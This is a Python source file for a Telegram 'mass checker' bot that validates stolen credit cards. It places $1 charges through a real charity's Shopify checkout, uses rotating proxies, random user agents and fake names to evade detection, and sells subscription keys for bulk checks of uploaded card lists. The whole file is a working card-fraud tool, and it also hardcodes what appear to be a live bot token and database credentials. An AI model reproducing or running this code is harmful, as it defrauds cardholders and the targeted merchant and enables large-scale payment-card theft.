import asyncio
import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re
import json
import uuid
import time
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
import pymongo
from pymongo import MongoClient
import logging
from datetime import datetime, timedelta
from aiohttp_proxy import ProxyConnector

# Configuration
TOKEN = '8181079198:AAFIE0MVuCPWaC0w1HbBsHlCLJKKGpbDneM'  # Replace with your bot token
OWNER_ID = 7593550190  # Replace with your Telegram ID
MONGO_URI = 'mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'  # Replace with your MongoDB URI
USE_PROXIES = True  # Set to False to disable proxies
PROXY_FILE = 'proxies.txt'

# Logging setup
logging.basicConfig(filename='bot.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Database setup
client = MongoClient(MONGO_URI)
db = client['bot_db']
users_collection = db['users']
keys_collection = db['keys']

# Load proxies
PROXIES = []
if USE_PROXIES:
    try:
        with open(PROXY_FILE, 'r') as f:
            PROXIES = [line.strip() for line in f.readlines() if line.strip()]
        logging.info("Proxies loaded successfully")
    except FileNotFoundError:
        logging.error("proxies.txt not found")
        PROXIES = []

# Global variables for tracking tasks
checking_tasks = {}

# Helper functions
def is_owner(user_id):
    return user_id == OWNER_ID

def get_user_subscription(user_id):
    user = users_collection.find_one({'user_id': user_id})
    if user and 'subscription_expiry' in user and user['subscription_expiry'] > datetime.now():
        return user['subscription_tier']
    return None

def update_checked_count(user_id, count):
    today = datetime.now().date()
    user = users_collection.find_one({'user_id': user_id})
    if not user:
        users_collection.insert_one({'user_id': user_id, 'checked_today': count, 'last_check_date': today})
    elif user.get('last_check_date') != today:
        users_collection.update_one({'user_id': user_id}, {'$set': {'checked_today': count, 'last_check_date': today}})
    else:
        users_collection.update_one({'user_id': user_id}, {'$inc': {'checked_today': count}})

def can_check_cards(user_id, count):
    tier = get_user_subscription(user_id)
    if is_owner(user_id):
        return True
    if not tier:
        return False
    user = users_collection.find_one({'user_id': user_id})
    checked_today = user.get('checked_today', 0) if user else 0
    limit = 500 if tier == 'Gold' else 1000 if tier == 'Platinum' else 0
    return (checked_today + count) <= limit

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

# Card checking function (adapted from sh.py)
async def check_card(card, user_id):
    start_time = time.time()
    ua = UserAgent()
    user_agent = ua.random
    emails = ["nicochan275@gmail.com"]
    first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
    last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)

    match = re.search(r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})', card)
    if not match:
        return "Invalid card format"
    n, mm, yy, cvc = match.groups()
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm = str(int(mm))
    yy = yy[2:] if len(yy) == 4 and yy.startswith("20") else yy
    full_card = f"{n}|{mm}|{yy}|{cvc}"

    proxy = get_random_proxy()
    connector = ProxyConnector.from_url(proxy) if proxy else None
    async with aiohttp.ClientSession(connector=connector) as r:
        try:
            async with r.get(f'https://bins.antipublic.cc/bins/{n}') as res:
                z = await res.json()
                bin_info = f"{z['type']} - {z['level']} - {z['brand']}"
                bank = z['bank']
                country = f"{z['country_name']}{z['country_flag']} - {z['country_currencies'][0]}"
        except:
            bin_info, bank, country = "Unknown", "Unknown", "Unknown"

        # Add to cart
        headers = {
            'user-agent': user_agent,
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
        }
        data = {
            'form_type': 'product',
            'utf8': '✓',
            'id': '39555780771934',
            'quantity': '1',
            'product-id': '6630341279838',
            'section-id': 'product-template',
        }
        async with r.post('https://www.buildingnewfoundations.com/cart/add.js', headers=headers, data=data) as response:
            if response.status != 200:
                return "Failed to add to cart"

        async with r.get('https://www.buildingnewfoundations.com/cart.js', headers=headers) as response:
            tok = (await response.json())['token']

        # Checkout
        headers.update({'content-type': 'application/x-www-form-urlencoded'})
        data = {'updates[]': '1', 'checkout': 'Check out'}
        async with r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True) as response:
            text = await response.text()
            x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
            queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
            stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
            paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

        # Payment session
        headers = {
            'user-agent': user_agent,
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/',
        }
        json_data = {
            'credit_card': {'number': cc, 'month': mm, 'year': yy, 'verification_value': cvc, 'name': f'{rfirst} {rlast}'},
            'payment_session_scope': 'buildingnewfoundations.com',
        }
        async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data) as response:
            sid = (await response.json())['id']

        # Submit for completion (simplified for brevity, full GraphQL query as in original)
        headers = {
            'user-agent': user_agent,
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/',
            'x-checkout-one-session-token': x,
        }
        params = {'operationName': 'SubmitForCompletion'}
        json_data = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{id __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage __typename}__typename}}}',
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': x},
                    'queueToken': queue_token,
                    'payment': {
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'sessionId': sid, 'paymentMethodIdentifier': paymentmethodidentifier}}, 'amount': {'value': {'amount': '1', 'currencyCode': 'USD'}}}]},
                    'merchandise': {'merchandiseLines': [{'stableId': stableid, 'quantity': {'items': {'value': 1}}}]},
                    'buyerIdentity': {'email': remail},
                },
                'attemptToken': tok,
            }
        }
        async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
            res_json = await response.json()
            rid = res_json['data']['submitForCompletion']['receipt']['id']

        # Poll for receipt
        params = {'operationName': 'PollForReceipt'}
        json_data = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{processingError{code __typename}__typename}}}',
            'variables': {'receiptId': rid, 'sessionToken': x},
        }
        elapsed_time = time.time() - start_time
        for _ in range(10):
            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
                text = await response.text()
                if "ProcessedReceipt" in text:
                    logging.info(f"Card {full_card} charged successfully by user {user_id}")
                    return f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Order # confirmed🔥
[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info}
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {'On' if proxy else 'Off'}
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» <a href='tg://user?id={user_id}'>You</a>
[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>"""
                elif "FailedReceipt" in text:
                    error_code = find_between(text, '"code":"', '"')
                    logging.info(f"Card {full_card} declined by user {user_id}")
                    return f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌
[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {error_code}
[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info}
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {'On' if proxy else 'Off'}
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» <a href='tg://user?id={user_id}'>You</a>
[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>"""
                elif "ProcessingReceipt" in text:
                    await asyncio.sleep(3)
                    continue
        return "Processing timeout"

def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

# Command handlers
async def start(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("Upload files", callback_data='upload')],
        [InlineKeyboardButton("Cancel", callback_data='cancel')],
        [InlineKeyboardButton("Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
        "🔥 𝐔𝐬𝐞 /sh 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n"
        "🔥 𝐔𝐬𝐞 /stop 𝐓𝐨 𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠\n"
        "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭o𝐧 𝐁𝐞𝐥𝐨𝐰:",
        reply_markup=reply_markup
    )

async def sh_command(update: Update, context):
    user_id = update.message.from_user.id
    if not can_check_cards(user_id, 1):
        await update.message.reply_text("You need an active subscription or have exceeded your daily limit.")
        return

    card = ' '.join(context.args)
    if not card:
        await update.message.reply_text("Usage: /sh 4242424242424242|11|26|000")
        return

    temp_message = await update.message.reply_text("🔍 Checking Your Card. Please Wait.....")
    result = await check_card(card, user_id)
    await context.bot.delete_message(chat_id=update.message.chat_id, message_id=temp_message.message_id)
    await update.message.reply_text(result, parse_mode='HTML')
    update_checked_count(user_id, 1)

async def callback_handler(update: Update, context):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if query.data == 'upload':
        await query.message.reply_text("Please send your .txt file for checking.")
    elif query.data == 'cancel':
        if user_id in checking_tasks:
            checking_tasks[user_id].cancel()
            del checking_tasks[user_id]
            await query.message.reply_text("Checking stopped.")
    elif query.data == 'help':
        await query.message.reply_text("Use /sh to check a single card\nUpload a .txt file for mass checking\nUse /stop to stop checking")

async def handle_file(update: Update, context):
    user_id = update.message.from_user.id
    if not can_check_cards(user_id, 1):  # Preliminary check, refined later
        await update.message.reply_text("You need an active subscription or have exceeded your daily limit.")
        return

    file = await update.message.document.get_file()
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    cards = [line.strip() for line in file_content.splitlines() if line.strip()]
    total = len(cards)

    if not can_check_cards(user_id, total):
        await update.message.reply_text(f"Your subscription limit ({500 if get_user_subscription(user_id) == 'Gold' else 1000}) is less than the number of cards ({total}).")
        return

    keyboard = [
        [InlineKeyboardButton("Charged🔥: 0", callback_data='charged'),
         InlineKeyboardButton("Declined❌: 0", callback_data='declined'),
         InlineKeyboardButton(f"Total💳: {total}", callback_data='total')],
        [InlineKeyboardButton("Stop🔴", callback_data='stop'),
         InlineKeyboardButton("Response💎: Starting...", callback_data='response')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    status_message = await update.message.reply_text(
        "🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...\n━━━━━━━━━━━━━━━━━━━━━━\n[み] 𝐁𝐨𝐭: @FN_B3_AUTH",
        reply_markup=reply_markup
    )

    async def mass_check():
        charged, declined, hits = 0, 0, []
        start_time = time.time()
        semaphore = asyncio.Semaphore(3)

        async def check_with_semaphore(card):
            async with semaphore:
                result = await check_card(card, user_id)
                nonlocal charged, declined, hits
                if "Charged" in result:
                    charged += 1
                    hits.append(card)
                else:
                    declined += 1
                update_checked_count(user_id, 1)
                keyboard[0][0].text = f"Charged🔥: {charged}"
                keyboard[0][1].text = f"Declined❌: {declined}"
                keyboard[1][1].text = f"Response💎: {result.splitlines()[2].split(' -» ')[1]}"
                await context.bot.edit_message_reply_markup(chat_id=update.message.chat_id, message_id=status_message.message_id, reply_markup=InlineKeyboardMarkup(keyboard))
                await asyncio.sleep(70)  # Timeout after each batch

        for i in range(0, total, 3):
            batch = cards[i:i+3]
            tasks = [check_with_semaphore(card) for card in batch]
            await asyncio.gather(*tasks)
            if user_id not in checking_tasks:  # Check if stopped
                break

        if user_id in checking_tasks:
            del checking_tasks[user_id]
            duration = time.time() - start_time
            speed = total / duration if duration > 0 else 0
            success_rate = (charged / total * 100) if total > 0 else 0
            hits_file = f"fn-shopify-hits-{random.randint(1000, 9999)}.txt"
            with open(hits_file, 'w') as f:
                f.write('\n'.join(hits))
            await context.bot.send_document(chat_id=update.message.chat_id, document=open(hits_file, 'rb'))
            await context.bot.send_message(
                chat_id=update.message.chat_id,
                text=f"[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡\n━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {charged}\n[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                     f"[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {charged + declined}/{total}\n[✪] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
                     f"[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n[✪] 𝐀𝐯𝐠 𝐒𝐩𝐒𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
                     f"[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.1f}%\n━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥</a>",
                parse_mode='HTML'
            )
            logging.info(f"Mass check completed for user {user_id}: {charged} charged, {declined} declined")

    task = asyncio.create_task(mass_check())
    checking_tasks[user_id] = task

async def stop(update: Update, context):
    user_id = update.message.from_user.id
    if user_id in checking_tasks:
        checking_tasks[user_id].cancel()
        del checking_tasks[user_id]
        await update.message.reply_text("Checking stopped.")

async def genkey(update: Update, context):
    user_id = update.message.from_user.id
    if not is_owner(user_id):
        await update.message.reply_text("This command is for the owner only.")
        return

    try:
        tier, days, quantity = context.args
        days, quantity = int(days), int(quantity)
        if tier not in ['Gold', 'Platinum']:
            raise ValueError
    except:
        await update.message.reply_text("Usage: /genkey {tier} {days} {quantity}\nExample: /genkey Gold 30 5")
        return

    keys = []
    for _ in range(quantity):
        key = str(uuid.uuid4())
        keys_collection.insert_one({'key': key, 'tier': tier, 'days': days, 'used_by': None, 'used_date': None})
        keys.append(key)

    keys_text = '\n'.join([f"➔ {key}" for key in keys])
    await update.message.reply_text(
        f"𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅\n𝐀𝐦𝐨𝐮𝐧𝐭: {quantity}\n\n{keys_text}\n𝐕𝐚𝐥𝐮𝐞: {tier} {days}\n\n"
        f"𝐅𝐨𝐫 𝐑𝐞𝐝𝐞𝐞𝐦𝐩𝐭𝐢𝐨𝐧\n𝐓𝐲𝐩𝐞 /redeem {{key}}",
        parse_mode='HTML'
    )
    logging.info(f"Generated {quantity} {tier} keys for {days} days by owner {user_id}")

async def redeem(update: Update, context):
    user_id = update.message.from_user.id
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem {key}")
        return

    key = context.args[0]
    key_doc = keys_collection.find_one({'key': key, 'used_by': None})
    if not key_doc:
        await update.message.reply_text("Invalid or already used key.")
        return

    expiry = datetime.now() + timedelta(days=key_doc['days'])
    users_collection.update_one(
        {'user_id': user_id},
        {'$set': {'subscription_tier': key_doc['tier'], 'subscription_expiry': expiry, 'last_check_date': datetime.now().date(), 'checked_today': 0}},
        upsert=True
    )
    keys_collection.update_one({'key': key}, {'$set': {'used_by': user_id, 'used_date': datetime.now()}})
    await update.message.reply_text(
        f"𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧 🎉\n\n𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐍𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅\n\n𝐕𝐚𝐥𝐮𝐞: {key_doc['tier']} {key_doc['days']}\n\n𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮",
        parse_mode='HTML'
    )
    logging.info(f"User {user_id} redeemed key {key} for {key_doc['tier']} ({key_doc['days']} days)")

async def delkey(update: Update, context):
    if not is_owner(update.message.from_user.id):
        await update.message.reply_text("This command is for the owner only.")
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /delkey {user_id}")
        return

    target_id = int(context.args[0])
    users_collection.update_one({'user_id': target_id}, {'$unset': {'subscription_tier': '', 'subscription_expiry': ''}})
    await update.message.reply_text(f"Subscription removed for user {target_id}.")
    logging.info(f"Owner removed subscription for user {target_id}")

async def broadcast(update: Update, context):
    if not is_owner(update.message.from_user.id):
        await update.message.reply_text("This command is for the owner only.")
        return

    message = ' '.join(context.args)
    if not message:
        await update.message.reply_text("Usage: /broadcast {message}")
        return

    users = users_collection.find()
    for user in users:
        try:
            await context.bot.send_message(chat_id=user['user_id'], text=message, parse_mode='HTML')
        except:
            logging.error(f"Failed to send broadcast to user {user['user_id']}")
    await update.message.reply_text("Broadcast sent successfully.")
    logging.info("Broadcast sent by owner")

# Main function
def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sh", sh_command))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("delkey", delkey))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(CallbackQueryHandler(callback_handler))
    application.run_polling()

if __name__ == '__main__':
    main()